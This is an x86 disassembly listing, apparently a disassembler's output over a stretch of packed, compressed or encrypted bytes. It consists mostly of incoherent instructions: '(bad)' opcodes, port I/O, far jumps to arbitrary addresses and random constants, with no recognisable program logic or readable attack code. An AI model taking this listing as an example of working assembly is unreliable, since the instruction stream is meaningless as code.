  40edf8:	or     al,0x1a
  40edfa:	arpl   WORD PTR [ecx],bp
  40edfc:	mov    edx,0x2d8ac28a
  40ee01:	jge    0x40ee25
  40ee03:	pop    ecx
  40ee04:	mov    bl,0x7a
  40ee06:	inc    eax
  40ee07:	adc    ecx,0xffffffac
  40ee0a:	inc    ebx
  40ee0b:	ss mov bl,0xbf
  40ee0e:	in     al,dx
  40ee0f:	stos   BYTE PTR es:[edi],al
  40ee10:	mov    ebx,0x27f97c4c
  40ee15:	pop    edi
  40ee16:	pop    esi
  40ee17:	call   0x82387e98
  40ee1c:	xor    eax,0x97314cca
  40ee21:	lods   al,BYTE PTR ds:[esi]
  40ee22:	repz dec edx
  40ee24:	or     dl,bl
  40ee26:	cmp    BYTE PTR [ecx+0x414cdd45],dh
  40ee2c:	repnz int3 
  40ee2e:	ror    DWORD PTR [ebx-0x3206dad7],cl
  40ee34:	dec    edx
  40ee35:	cmp    al,0xd6
  40ee37:	push   ds
  40ee38:	jecxz  0x40ee0b
  40ee3a:	icebp  
  40ee3b:	loopne 0x40ee74
  40ee3d:	(bad)  
  40ee3e:	(bad)  [eax+eiz*2]
  40ee41:	imul   eax,ebx,0xb3e19a6b
  40ee47:	mov    al,BYTE PTR [eax+0x79e06cfa]
  40ee4d:	pop    ds
  40ee4e:	pop    ebp
  40ee4f:	and    eax,0x569e6ce8
  40ee54:	push   ebp
  40ee55:	xchg   bl,bh
  40ee57:	dec    esp
  40ee58:	imul   eax,esi
  40ee5b:	sbb    BYTE PTR [edi+0x6f],ch
  40ee5e:	out    dx,al
  40ee5f:	jno    0x40eed3
  40ee61:	sub    DWORD PTR [ebx],esi
  40ee63:	cmp    al,0xb1
  40ee65:	test   DWORD PTR [esi],esi
  40ee67:	out    dx,al
  40ee68:	mov    bh,0xb3
  40ee6a:	xlat   BYTE PTR ds:[ebx]
  40ee6b:	mov    cl,0xa8
  40ee6d:	adc    DWORD PTR [ebx+0x50],eax
  40ee70:	(bad)  
  40ee71:	mov    ecx,0x591011a6
  40ee76:	mov    esp,0x661e290f
  40ee7b:	jmp    0xd2f3:0xf5830f59
  40ee82:	dec    esp
  40ee83:	pop    ebp
  40ee84:	cdq    
  40ee85:	jbe    0x40ee29
  40ee87:	aad    0xa3
  40ee89:	scas   al,BYTE PTR es:[edi]
  40ee8a:	cmc    
  40ee8b:	cmp    DWORD PTR [eax-0x6c518a03],eax
  40ee91:	mov    ah,0xd9
  40ee93:	or     BYTE PTR [edi+0x71e7030c],0x71
  40ee9a:	jae    0x40ee1f
  40ee9c:	mov    edx,0x159be4ec
  40eea1:	xchg   edx,eax
  40eea2:	pop    eax
  40eea3:	and    dh,al
  40eea5:	add    dl,dh
  40eea7:	mov    dl,0x8c
  40eea9:	test   BYTE PTR [edi-0x3a],ah
  40eeac:	or     DWORD PTR [esi+ebx*1],ebp
  40eeaf:	push   eax
  40eeb0:	retf   0xc097
  40eeb3:	pop    ecx
  40eeb4:	pop    es
  40eeb5:	cs std 
  40eeb7:	iret   
  40eeb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeb9:	cmp    DWORD PTR [ebx],ecx
  40eebb:	int    0x33
  40eebd:	jecxz  0x40eedc
  40eebf:	cs (bad) 
  40eec2:	pop    esp
  40eec3:	sub    dl,BYTE PTR [eax+0x77]
  40eec6:	pop    esp
  40eec7:	mov    esp,0xbb09b1d2
  40eecc:	in     al,dx
  40eecd:	daa    
  40eece:	loope  0x40ee7b
  40eed0:	push   ss
  40eed1:	xlat   BYTE PTR ds:[ebx]
  40eed2:	outs   dx,BYTE PTR ds:[esi]
  40eed3:	add    ch,BYTE PTR [edx+0x61]
  40eed6:	mov    ds:0x841e1f0a,al
  40eedb:	jbe    0x40ee7b
  40eedd:	cmp    dl,BYTE PTR ds:0xa8e4a004
  40eee3:	mov    cl,0xca
  40eee5:	inc    edx
  40eee6:	retf   0x8266
  40eee9:	mov    eax,0x88bc99e7
  40eeee:	mov    al,0xe6
  40eef0:	pop    esp
  40eef1:	add    eax,0xc4598e1d
  40eef6:	xor    al,0xff
  40eef8:	dec    esp
  40eef9:	push   esi
  40eefa:	dec    ecx
  40eefb:	mov    ah,0xff
  40eefd:	dec    edi
  40eefe:	ins    BYTE PTR es:[edi],dx
  40eeff:	or     al,0xaf
  40ef01:	pop    esi
  40ef02:	in     eax,dx
  40ef03:	or     BYTE PTR [esi-0x73684a8e],0x71
  40ef0a:	shr    DWORD PTR [edx+0x501a1e77],0x56
  40ef11:	mov    eax,ds:0xea2522e7
  40ef16:	bound  ecx,QWORD PTR [eax-0x7de44e57]
  40ef1c:	mov    WORD PTR [esi],es
  40ef1e:	cli    
  40ef1f:	add    ebx,DWORD PTR [ebx+0x79]
  40ef22:	mov    al,0x94
  40ef24:	jno    0x40eefd
  40ef26:	mov    ds:0x972e71d4,al
  40ef2b:	loop   0x40ef92
  40ef2d:	test   BYTE PTR [ebp-0x80],al
  40ef30:	jl     0x40eed6
  40ef32:	dec    ebp
  40ef33:	dec    ecx
  40ef34:	(bad)
  40ef38:	xchg   esp,eax
  40ef39:	adc    edi,eax
  40ef3b:	xor    esi,DWORD PTR [ecx-0x2df7986b]
  40ef41:	or     ecx,0xd9127472
  40ef47:	xlat   BYTE PTR ds:[ebx]
  40ef48:	ins    DWORD PTR es:[edi],dx
  40ef49:	sub    DWORD PTR [edi+0x11],esp
  40ef4c:	pushf  
  40ef4d:	inc    esp
  40ef4e:	loop   0x40eee6
  40ef50:	sbb    dh,al
  40ef52:	push   eax
  40ef53:	mov    ss,WORD PTR [ecx+0x65]
  40ef56:	mov    cl,0x71
  40ef58:	xor    eax,0xc361a22c
  40ef5d:	fwait
  40ef5e:	clc    
  40ef5f:	mov    ecx,0xb2e20187
  40ef64:	idiv   DWORD PTR [ebp-0x19]
  40ef67:	inc    edx
  40ef68:	push   0xdc56d75c
  40ef6d:	xor    DWORD PTR [ebp+0x70],0xefd2a213
  40ef74:	or     DWORD PTR [eax],ecx
  40ef76:	push   edx
  40ef77:	cmp    ebx,DWORD PTR [edi+0x51]
  40ef7a:	call   0xb339d78b
  40ef7f:	pop    esi
  40ef80:	or     eax,0xffffffce
  40ef83:	out    dx,eax
  40ef84:	inc    edi
  40ef85:	mov    edi,0xe5329294
  40ef8a:	sbb    al,0xce
  40ef8c:	aam    0xb6
  40ef8e:	xchg   ecx,eax
  40ef8f:	push   ecx
  40ef90:	fldcw  WORD PTR [edi]
  40ef92:	je     0x40f005
  40ef94:	xchg   ebp,eax
  40ef95:	cmp    DWORD PTR [edx-0x20cfd89],edx
  40ef9b:	mov    eax,ss:0xca1a18e1
  40efa1:	mov    BYTE PTR [edi],dh
  40efa3:	xchg   ebp,eax
  40efa4:	sti    
  40efa5:	sub    eax,0x7d002f4f
  40efaa:	or     DWORD PTR [esp+ecx*4-0x501af10b],edx
  40efb1:	mov    bl,0x12
  40efb3:	iret   
  40efb4:	(bad)  
  40efb6:	add    DWORD PTR [esi-0x3c07a37c],edx
  40efbc:	fnstenv [ebx-0x27]
  40efbf:	or     BYTE PTR [esp+edi*1],cl
  40efc2:	ins    BYTE PTR es:[edi],dx
  40efc3:	outs   dx,DWORD PTR ds:[esi]
  40efc4:	pop    edx
  40efc5:	lea    ebp,[eax]
  40efc7:	dec    ebx
  40efc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efc9:	fnsave [ecx]
  40efcb:	mov    ebx,0x7ccf7912
  40efd0:	mov    BYTE PTR [edx+0x52],al
  40efd3:	dec    esp
  40efd4:	jne    0x40efb4
  40efd6:	mov    eax,ds:0xcb08412d
  40efdb:	xor    BYTE PTR [edx],0xfc
  40efde:	xchg   edi,eax
  40efdf:	xchg   ebx,eax
  40efe0:	mov    ch,0xd5
  40efe2:	int    0xc8
  40efe4:	sbb    BYTE PTR [edx-0x30b6d736],dl
  40efea:	rcr    DWORD PTR [esi+0x1fc65d81],0x12
  40eff1:	jne    0x40f033
  40eff3:	pop    eax
  40eff4:	call   0x1fcde4ce
  40eff9:	sub    eax,0x4d54e07b
  40effe:	sbb    ecx,DWORD PTR [eax-0x1336beea]
  40f004:	mov    dh,0x79
  40f006:	push   ebp
  40f007:	dec    ecx
  40f008:	xor    ebx,edx
  40f00a:	add    BYTE PTR [ebp-0x5690f6a4],bh
  40f010:	inc    edx
  40f011:	push   ss
  40f012:	push   ebx
  40f013:	jno    0x40f013
  40f015:	jle    0x40f040
  40f017:	ins    DWORD PTR es:[edi],dx
  40f018:	das    
  40f019:	jmp    0x40f052
  40f01b:	sar    esp,1
  40f01d:	ret    0x93e4
  40f020:	scas   al,BYTE PTR es:[edi]
  40f021:	in     al,0x5e
  40f023:	out    0x17,eax
  40f025:	pop    ebx
  40f026:	popa   
  40f027:	adc    al,0x33
  40f029:	out    dx,al
  40f02a:	dec    ecx
  40f02b:	add    BYTE PTR [edi-0x594ba469],0x2
  40f032:	sbb    eax,0xe6b469e9
  40f037:	lods   eax,DWORD PTR ds:[esi]
  40f038:	pushf  
  40f039:	shl    BYTE PTR [ecx],cl
  40f03b:	stos   BYTE PTR es:[edi],al
  40f03c:	xlat   BYTE PTR ds:[ebx]
  40f03d:	add    al,0xfc
  40f03f:	retf   
  40f040:	or     bh,BYTE PTR [esi+ebp*4-0x4e289a28]
  40f047:	cwde   
  40f048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f049:	test   DWORD PTR [ebx+0x5f47d8c0],eax
  40f04f:	test   eax,0x5abb02d2
  40f054:	scas   eax,DWORD PTR es:[edi]
  40f055:	bound  eax,QWORD PTR [edx+0x1b05afde]
  40f05b:	jnp    0x40f063
  40f05d:	lods   eax,DWORD PTR ds:[esi]
  40f05e:	retf   
  40f05f:	call   0xe2a8602b
  40f064:	mov    bh,BYTE PTR [edx]
  40f066:	and    eax,0x6072ec4b
  40f06b:	mov    dh,0xb
  40f06d:	mov    ah,0x95
  40f06f:	add    ah,BYTE PTR [ecx+0x1733f007]
  40f075:	pop    ds
  40f076:	or     eax,0xa74f0612
  40f07b:	call   0x3508a795
  40f080:	jl     0x40f05b
  40f082:	repz dec edi
  40f084:	pushf  
  40f085:	repnz push ebx
  40f087:	enter  0x73f6,0x8d
  40f08b:	cmp    BYTE PTR [ebx+0x73],bh
  40f08e:	nop    esi
  40f091:	lods   al,BYTE PTR ds:[esi]
  40f092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f093:	mul    DWORD PTR ds:0x737c3679
  40f099:	test   al,0x4
  40f09b:	xchg   ebx,eax
  40f09c:	outs   dx,BYTE PTR ds:[esi]
  40f09d:	sbb    dl,dh
  40f09f:	iret   
  40f0a0:	mov    eax,0xddfa3629
  40f0a5:	ja     0x40f072
  40f0a7:	jge    0x40f058
  40f0a9:	jno    0x40f10f
  40f0ab:	cli    
  40f0ac:	fisttp WORD PTR [edi-0x1c]
  40f0af:	push   0x5ebb69f
  40f0b4:	pop    edi
  40f0b5:	cli    
  40f0b6:	sbb    eax,0xc7e1a354
  40f0bb:	sub    BYTE PTR [eax],0xdf
  40f0be:	sbb    DWORD PTR [edi],edx
  40f0c0:	fstp   QWORD PTR [eax-0x67]
  40f0c3:	stos   DWORD PTR es:[edi],eax
  40f0c4:	sbb    dh,BYTE PTR [ecx-0xf]
  40f0c7:	stos   BYTE PTR es:[edi],al
  40f0c8:	dec    ebp
  40f0c9:	cs pusha 
  40f0cb:	ss inc esi
  40f0cd:	mov    ds:0x6a1d268a,al
  40f0d2:	mov    dl,0xb0
  40f0d4:	int    0x2e
  40f0d6:	lods   eax,DWORD PTR ds:[esi]
  40f0d7:	cld    
  40f0d8:	sbb    eax,DWORD PTR [ecx-0x3cbb3680]
  40f0de:	jae    0x40f088
  40f0e0:	sbb    bl,ch
  40f0e2:	dec    esi
  40f0e3:	pop    es
  40f0e4:	push   0xf58c5bb2
  40f0e9:	mov    bh,0x84
  40f0eb:	rcr    BYTE PTR [ebp-0x61],1
  40f0ee:	in     eax,dx
  40f0ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0f0:	lds    esi,FWORD PTR [edi+0x5a391744]
  40f0f6:	mov    al,0xbb
  40f0f8:	adc    BYTE PTR ss:[ecx],0xb1
  40f0fc:	pushf  
  40f0fd:	xchg   edi,eax
  40f0fe:	xor    esi,DWORD PTR [esi]
  40f100:	or     BYTE PTR [eax],ah
  40f102:	rcr    BYTE PTR [ebx+0x99aa05f],1
  40f108:	mov    bh,0x5b
  40f10a:	or     al,0x7
  40f10c:	fs jmp 0x4e4c:0xd7d1a16a
  40f114:	test   BYTE PTR [eax+edx*1+0x14],cl
  40f118:	or     al,0x8b
  40f11a:	jp     0x40f106
  40f11c:	shl    DWORD PTR [ebx-0x47],0x1e
  40f120:	shr    DWORD PTR [eax+ecx*8+0x17],cl
  40f124:	retf   
  40f125:	and    eax,0x48b7c143
  40f12a:	xchg   esp,eax
  40f12b:	sub    al,0xd5
  40f12d:	loope  0x40f0f0
  40f12f:	int3   
  40f130:	sti    
  40f131:	jnp    0x40f0d4
  40f133:	ja     0x40f0d9
  40f135:	jns    0x40f17b
  40f137:	mov    eax,0xb2105904
  40f13c:	pop    ss
  40f13d:	sub    al,0x50
  40f13f:	jnp    0x40f137
  40f141:	mov    edi,0x51fe5957
  40f146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f147:	retf   0xb5fc
  40f14a:	loope  0x40f12b
  40f14c:	inc    esi
  40f14d:	jecxz  0x40f12b
  40f14f:	and    DWORD PTR [ebp+edx*4+0x7e97c41e],edx
  40f156:	lock scas al,BYTE PTR es:[edi]
  40f158:	push   0x26
  40f15a:	xchg   edx,eax
  40f15b:	and    eax,0x94867ad2
  40f160:	add    edi,esp
  40f162:	and    ebp,DWORD PTR [edi]
  40f164:	jae    0x40f143
  40f166:	push   cs
  40f167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f168:	mov    eax,ds:0xf4e6ec5c
  40f16d:	dec    edx
  40f16e:	pop    eax
  40f16f:	das    
  40f170:	or     DWORD PTR [eax],esp
  40f172:	jcxz   0x40f1bb
  40f175:	jae    0x40f105
  40f177:	test   esi,0x59a79742
  40f17d:	fidiv  WORD PTR [ebx+ecx*8]
  40f180:	add    BYTE PTR [ecx+0x2bb37a6e],cl
  40f186:	mov    al,0xeb
  40f188:	sub    BYTE PTR [ecx+0x25],cl
  40f18b:	retf   0x8ed4
  40f18e:	push   ecx
  40f18f:	ja     0x40f188
  40f191:	push   edx
  40f192:	or     bh,BYTE PTR [edx-0x6fa4ca58]
  40f198:	pop    edx
  40f199:	aas    
  40f19a:	pusha  
  40f19b:	les    ebx,FWORD PTR [edi-0x3f]
  40f19e:	pop    esi
  40f19f:	stos   BYTE PTR es:[edi],al
  40f1a0:	mov    ch,0x24
  40f1a2:	dec    ebx
  40f1a3:	aas    
  40f1a4:	jg     0x40f21e
  40f1a6:	mov    bl,0x3b
  40f1a8:	jl     0x40f200
  40f1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ab:	inc    eax
  40f1ac:	add    eax,0x29cf90da
  40f1b1:	jle    0x40f220
  40f1b3:	imul   ebp,DWORD PTR [ecx],0x8cfc6421
  40f1b9:	mov    ebx,0x882c3cda
  40f1be:	cmp    al,0xd7
  40f1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1c1:	push   cs
  40f1c2:	dec    edx
  40f1c3:	pushf  
  40f1c4:	inc    edi
  40f1c5:	cmp    eax,0xf20d80cb
  40f1ca:	icebp  
  40f1cb:	sub    BYTE PTR [ecx],ah
  40f1cd:	in     al,dx
  40f1ce:	jmp    0x641a2c16
  40f1d3:	xchg   edi,eax
  40f1d4:	shl    DWORD PTR ss:[esi-0x5d],1
  40f1d8:	dec    eax
  40f1d9:	aas    
  40f1da:	xor    BYTE PTR [ebp+0x60],dl
  40f1dd:	daa    
  40f1de:	sub    al,BYTE PTR [ebx-0x567f997c]
  40f1e4:	(bad)  
  40f1e5:	mov    dl,0x47
  40f1e7:	out    dx,eax
  40f1e8:	adc    eax,0xa691af3f
  40f1ed:	and    edi,DWORD PTR [ebp+0x34]
  40f1f0:	test   eax,0xd9533dc5
  40f1f5:	scas   al,BYTE PTR es:[edi]
  40f1f6:	lods   al,BYTE PTR ds:[esi]
  40f1f7:	or     DWORD PTR [ebp-0x26135c77],esi
  40f1fd:	adc    eax,0x2402d670
  40f202:	lods   eax,DWORD PTR ds:[esi]
  40f203:	cli    
  40f204:	jns    0x40f247
  40f206:	sub    edi,esi
  40f208:	xor    eax,0x1e96ca2c
  40f20d:	jecxz  0x40f288
  40f20f:	adc    eax,0x96bdca9
  40f214:	stc    
  40f215:	add    BYTE PTR [eax],dh
  40f217:	add    BYTE PTR [eax],0x70
  40f21a:	xchg   ebp,eax
  40f21b:	daa    
  40f21c:	push   eax
  40f21d:	push   0xd3e10216
  40f222:	outs   dx,BYTE PTR ds:[esi]
  40f223:	outs   dx,DWORD PTR ds:[esi]
  40f224:	enter  0x7527,0xfe
  40f228:	and    eax,0x591c43a9
  40f22d:	mov    eax,0x1ecb53d1
  40f232:	and    edx,DWORD PTR [ecx+eiz*8-0x59526e07]
  40f239:	adc    edi,DWORD PTR [ebp+0x2e59615f]
  40f23f:	push   ebp
  40f240:	jmp    0xea032b8
  40f245:	xchg   ebx,eax
  40f246:	arpl   WORD PTR [ecx-0x3af0c382],bp
  40f24c:	out    0x21,eax
  40f24e:	xchg   esi,eax
  40f24f:	adc    esp,DWORD PTR [ecx]
  40f251:	cmp    eax,0xd65cc1fc
  40f256:	int3   
  40f257:	aam    0x7a
  40f259:	in     al,0x71
  40f25b:	push   ds
  40f25c:	cwde   
  40f25d:	mov    al,0x68
  40f25f:	cli    
  40f260:	push   esi
  40f261:	call   0x178e:0xe398ed
  40f268:	or     esi,DWORD PTR [edi+esi*1-0x4a]
  40f26c:	aad    0x77
  40f26e:	and    eax,0xe530bce6
  40f273:	icebp  
  40f274:	repnz xor BYTE PTR [ecx-0x93d002],dl
  40f27b:	mov    eax,ds:0x86016d3c
  40f280:	inc    edx
  40f281:	imul   eax,DWORD PTR [ecx-0x2b],0x52
  40f285:	push   ebx
  40f286:	push   edi
  40f287:	add    esi,ebx
  40f289:	cmp    DWORD PTR [ecx],ecx
  40f28b:	and    ch,BYTE PTR [ebx+0x4439fd8b]
  40f291:	mov    ah,BYTE PTR [ecx+0x77]
  40f294:	cmp    edi,ebp
  40f296:	jae    0x40f295
  40f298:	xchg   ecx,eax
  40f299:	or     eax,0x7fb69b81
  40f29e:	lds    edi,FWORD PTR [ecx-0x3d]
  40f2a1:	fsub   st(2),st
  40f2a3:	ret    0x8c6e
  40f2a6:	(bad)  
  40f2a7:	(bad)  [eax+ecx*8]
  40f2aa:	add    eax,0x727226ec
  40f2af:	test   BYTE PTR [ecx-0x1d],al
  40f2b2:	pop    eax
  40f2b3:	clc    
  40f2b4:	rcl    edx,cl
  40f2b6:	mov    WORD PTR [ecx],fs
  40f2b8:	test   BYTE PTR [edx],ch
  40f2ba:	(bad)  
  40f2bb:	dec    eax
  40f2bc:	jae    0x40f2a5
  40f2be:	(bad)  
  40f2bf:	jno    0x40f30a
  40f2c1:	in     al,dx
  40f2c2:	(bad)  
  40f2c3:	xor    DWORD PTR [esi],edi
  40f2c5:	jo     0x40f25b
  40f2c7:	pop    ebp
  40f2c8:	sbb    BYTE PTR [edx+0x873adc8],ah
  40f2ce:	loop   0x40f27a
  40f2d0:	dec    ecx
  40f2d1:	pop    ss
  40f2d2:	loop   0x40f305
  40f2d4:	in     eax,0xb1
  40f2d6:	and    ch,BYTE PTR [edx]
  40f2d8:	lds    edi,FWORD PTR [edi]
  40f2da:	jge    0x40f323
  40f2dc:	sbb    DWORD PTR [edx],ebx
  40f2de:	outs   dx,DWORD PTR ds:[esi]
  40f2df:	and    al,0x6c
  40f2e1:	adc    esi,eax
  40f2e3:	aad    0xd
  40f2e5:	xchg   ebp,eax
  40f2e6:	xchg   esp,eax
  40f2e7:	int3   
  40f2e8:	test   eax,0x43c00ff6
  40f2ed:	mov    bh,0xd8
  40f2ef:	test   al,0x1a
  40f2f1:	aad    0x5e
  40f2f3:	jge    0x40f2df
  40f2f5:	dec    ecx
  40f2f6:	fisub  WORD PTR [ecx]
  40f2f8:	je     0x40f32a
  40f2fa:	std    
  40f2fb:	dec    eax
  40f2fc:	fdiv   DWORD PTR [ecx+0x2f59df08]
  40f302:	dec    ebp
  40f303:	xchg   esi,eax
  40f304:	sub    ch,BYTE PTR [edi]
  40f306:	pop    edi
  40f307:	inc    edi
  40f308:	xor    BYTE PTR [ebx+ecx*2+0x1a5a47c0],dh
  40f30f:	sub    al,0xfe
  40f311:	int    0x1b
  40f313:	adc    ebp,DWORD PTR [edi]
  40f315:	xor    DWORD PTR [eax],eax
  40f317:	(bad)  
  40f318:	mov    eax,ds:0xd0c51809
  40f31d:	cmp    al,0x7c
  40f31f:	(bad)  
  40f320:	adc    eax,0x36ec5361
  40f325:	popf   
  40f326:	je     0x40f32a
  40f328:	add    bl,BYTE PTR ss:[edx]
  40f32b:	mov    cl,0x7c
  40f32d:	jb     0x40f32f
  40f32f:	icebp  
  40f330:	mov    dh,0x59
  40f332:	xlat   BYTE PTR ds:[ebx]
  40f333:	stos   DWORD PTR es:[edi],eax
  40f334:	push   eax
  40f335:	femms  
  40f337:	sub    cl,dl
  40f339:	out    dx,al
  40f33a:	clc    
  40f33b:	cmp    esp,DWORD PTR ds:0xc149e2e3
  40f341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f342:	and    ebx,esi
  40f344:	lahf   
  40f345:	add    eax,0x1076c4a2
  40f34a:	mov    esp,0x9bd5a048
  40f34f:	fsub   st(2),st
  40f351:	sub    BYTE PTR [ecx],dl
  40f353:	imul   eax,DWORD PTR [eax+ecx*1],0xb638bfa
  40f35a:	jb     0x40f2e7
  40f35c:	cdq    
  40f35d:	xor    eax,0xed7891a4
  40f362:	(bad)  
  40f363:	push   ebp
  40f364:	xor    cl,BYTE PTR [ecx+0xd]
  40f367:	mov    es,WORD PTR [esi+0x47]
  40f36a:	loopne 0x40f3ba
  40f36c:	adc    BYTE PTR [edx],dh
  40f36e:	mov    ?,WORD PTR ds:0x477d7731
  40f374:	hlt    
  40f375:	outs   dx,DWORD PTR ds:[esi]
  40f376:	jns    0x40f3e0
  40f378:	(bad)  
  40f379:	pop    ebx
  40f37a:	test   dh,0xd0
  40f37d:	cmp    al,0xb
  40f37f:	xchg   edx,eax
  40f380:	xchg   ebp,eax
  40f381:	and    eax,edi
  40f383:	retf   0xc474
  40f386:	pop    edi
  40f387:	push   ebx
  40f388:	rol    BYTE PTR [ebx+0x3],1
  40f38b:	imul   ebx,DWORD PTR [edx-0xb],0x10
  40f38f:	fimul  DWORD PTR [esi+0x3d]
  40f392:	outs   dx,DWORD PTR ds:[esi]
  40f393:	adc    ecx,DWORD PTR [edi-0x38]
  40f396:	jo     0x40f351
  40f398:	inc    ebp
  40f399:	stos   BYTE PTR es:[edi],al
  40f39a:	or     al,0x5
  40f39c:	dec    ecx
  40f39d:	sbb    eax,esi
  40f39f:	sub    eax,0xf9beb838
  40f3a4:	jb     0x40f3dd
  40f3a6:	out    dx,eax
  40f3a7:	int    0x56
  40f3a9:	mov    al,0x80
  40f3ab:	pop    ds
  40f3ac:	shl    DWORD PTR ds:0x6c47871,0xce
  40f3b3:	sbb    dh,ch
  40f3b5:	jle    0x40f400
  40f3b7:	adc    dh,dl
  40f3b9:	dec    ecx
  40f3ba:	cmp    DWORD PTR [ebp+0x2db1463],ecx
  40f3c0:	retf   
  40f3c1:	sbb    BYTE PTR [edx+0x293b1395],cl
  40f3c7:	adc    bl,BYTE PTR [ebx]
  40f3c9:	(bad)  
  40f3ca:	sbb    al,0x7d
  40f3cc:	fs xchg esp,eax
  40f3ce:	cmp    al,0xec
  40f3d1:	imul   eax,DWORD PTR [ebp+0x24518924],0x85fde9e7
  40f3db:	aaa    
  40f3dc:	pop    eax
  40f3dd:	adc    al,0x6d
  40f3df:	mov    esi,?
  40f3e1:	and    bh,BYTE PTR [edi]
  40f3e3:	push   esi
  40f3e4:	imul   eax,DWORD PTR [edx-0x80],0x7934789d
  40f3eb:	in     eax,0xdd
  40f3ed:	pop    eax
  40f3ee:	fwait
  40f3ef:	in     al,0x65
  40f3f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3f2:	ret    0x9010
  40f3f5:	jmp    FWORD PTR [edx*1+0xf636d26]
  40f3fc:	jge    0x40f383
  40f3fe:	into   
  40f3ff:	sbb    ch,dh
  40f401:	mov    ds:0x18f7022,al
  40f406:	mov    eax,0x6d58043e
  40f40b:	aam    0xec
  40f40d:	int    0x2
  40f40f:	xchg   ecx,eax
  40f410:	add    DWORD PTR [ebx+0x6e],0xee8045a
  40f417:	mov    bh,0x68
  40f419:	pop    edx
  40f41a:	test   BYTE PTR [ecx+0x799e90b7],dl
  40f420:	je     0x40f3e9
  40f422:	mov    dl,0x1f
  40f424:	push   ecx
  40f425:	and    DWORD PTR [edx-0x33],0xfffffffa
  40f429:	lock jns 0x40f47d
  40f42c:	dec    esp
  40f42d:	dec    eax
  40f42e:	and    ebx,DWORD PTR [eax-0x35e4e0ca]
  40f434:	mov    ch,0xce
  40f436:	xchg   esi,eax
  40f437:	xchg   esi,eax
  40f438:	int    0x36
  40f43a:	pop    edi
  40f43b:	push   esp
  40f43c:	cmp    al,BYTE PTR [eax+0x3b]
  40f43f:	in     al,0x32
  40f441:	dec    edi
  40f442:	and    BYTE PTR [edi-0x7322856a],0xfd
  40f449:	sub    ah,dl
  40f44b:	(bad)  
  40f44c:	adc    bl,BYTE PTR [edi]
  40f44e:	xchg   dl,al
  40f450:	(bad)  
  40f451:	fimul  WORD PTR [eax-0x79fe0881]
  40f457:	push   edi
  40f458:	xchg   edx,eax
  40f459:	stc    
  40f45a:	retf   
  40f45b:	push   es
  40f45c:	mov    ch,0xf4
  40f45e:	ror    bl,1
  40f460:	xchg   DWORD PTR ds:0xd6b5970a,ecx
  40f466:	add    dl,dh
  40f468:	jmp    0x40f4a0
  40f46a:	leave  
  40f46b:	jl     0x40f491
  40f46d:	push   edi
  40f46e:	int3   
  40f46f:	sub    DWORD PTR [eax-0x2f],eax
  40f472:	test   esi,eax
  40f474:	in     al,0x3b
  40f476:	sub    al,0x45
  40f478:	hlt    
  40f479:	xchg   esi,eax
  40f47a:	mov    ?,edx
  40f47c:	jnp    0x40f466
  40f47e:	adc    eax,0x5cc31f30
  40f483:	inc    esi
  40f484:	push   0x1adcc049
  40f489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f48a:	lock les ebp,FWORD PTR [eax]
  40f48d:	push   ds
  40f48e:	dec    edi
  40f48f:	ds pop es
  40f491:	inc    DWORD PTR [edi+0xa9e2]
	...
  40f513:	add    ah,dh
  40f515:	test   BYTE PTR [eax-0x6b],cl
  40f518:	js     0x40f4f7
  40f51a:	std    
  40f51b:	in     eax,0xbe
  40f51d:	mov    bh,0x36
  40f51f:	and    BYTE PTR ds:0xa1698351,0x0
  40f527:	add    BYTE PTR [ecx+0x7],ch
  40f52a:	add    BYTE PTR [eax],al
  40f52c:	cli    
  40f52d:	jmp    0x127ae401
  40f532:	jmp    0x8ea039d1
  40f537:	push   edi
  40f538:	in     eax,0x72
  40f53a:	adc    DWORD PTR [edx],ecx
  40f53c:	mov    ds:0xc2069d9,al
  40f541:	dec    esp
  40f542:	dec    ebx
  40f543:	xor    BYTE PTR [ebp-0x723f958d],ah
  40f549:	(bad)  
  40f54a:	jmp    DWORD PTR [esi+0x62abbd94]
  40f550:	cwde   
  40f551:	ja     0x40f5a2
  40f553:	jns    0x40f51c
  40f555:	mov    esp,DWORD PTR [ecx+0x16334100]
  40f55b:	outs   dx,BYTE PTR ds:[esi]
  40f55c:	adc    eax,0x844ab63f
  40f561:	push   edx
  40f562:	cmp    BYTE PTR [eax-0xe],ch
  40f565:	and    esp,DWORD PTR ds:0xbc91de9a
  40f56b:	mov    bl,0xf9
  40f56d:	sbb    ecx,edi
  40f56f:	inc    ecx
  40f570:	shl    DWORD PTR [edi-0x4a],1
  40f573:	dec    ebp
  40f574:	or     al,BYTE PTR [eax]
  40f576:	mov    bl,0x32
  40f578:	ret    
  40f579:	pop    ebp
  40f57a:	sub    al,BYTE PTR [edi+0x67]
  40f57d:	es gs push edi
  40f580:	pop    esp
  40f581:	and    DWORD PTR [eax],edx
  40f583:	mov    bl,0x20
  40f585:	shl    BYTE PTR [edx-0x52843e44],1
  40f58b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f58c:	mov    WORD PTR [ebx-0xc],ss
  40f58f:	inc    esi
  40f590:	dec    esi
  40f591:	lahf   
  40f592:	xor    esp,DWORD PTR [esi-0x39]
  40f595:	push   0x7c142210
  40f59a:	add    BYTE PTR [eax+0x1c],bh
  40f59d:	cdq    
  40f59e:	leave  
  40f59f:	(bad)  
  40f5a0:	aam    0x33
  40f5a2:	popf   
  40f5a3:	push   ds
  40f5a4:	int3   
  40f5a5:	sub    bl,BYTE PTR [eax]
  40f5a7:	sub    al,BYTE PTR [edx+0x7a0d031b]
  40f5ad:	sar    eax,1
  40f5af:	add    ah,BYTE PTR [edx]
  40f5b1:	mov    al,ds:0xb8b1fb47
  40f5b6:	add    BYTE PTR [eax+0x3d],dl
  40f5b9:	xor    ebp,DWORD PTR [edi]
  40f5bb:	lock loopne 0x40f5e7
  40f5be:	test   BYTE PTR [edx-0x6d3fa5bb],ah
  40f5c4:	xor    edx,ecx
